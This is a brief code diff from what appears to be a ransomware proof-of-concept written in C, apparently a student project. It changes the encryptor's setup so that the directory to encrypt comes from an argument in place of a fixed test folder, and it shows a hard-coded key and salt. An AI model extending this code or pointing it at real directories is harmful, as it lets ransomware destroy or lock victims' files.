@@ -5,7 +5,7 @@
   * @ransom: la
   * Return: la
  **/
-ransom_t *init_struct(ransom_t *ransom)
+ransom_t *init_struct(ransom_t *ransom, char *target_dir)
 {
 	char *file_exts = "/home/vagrant/FourNights/c_poc/file_exts.txt";
 	unsigned int salt[] = {12345, 54321};
@@ -29,7 +29,7 @@ ransom_t *init_struct(ransom_t *ransom)
 	ransom->key = "Holberton";
 	ransom->salt = salt;
 	ransom->cipher_flag = 'e'; /* set cipher_flag to encrypt */
-	ransom->root_path = "/home/vagrant/FourNights/TESTS/";
+	ransom->root_path = target_dir;
 	lstat(file_exts, &(ransom->target_file_buf->file_info));
 	if(read_file(file_exts, ransom, tokenizer) < 1)
 	{
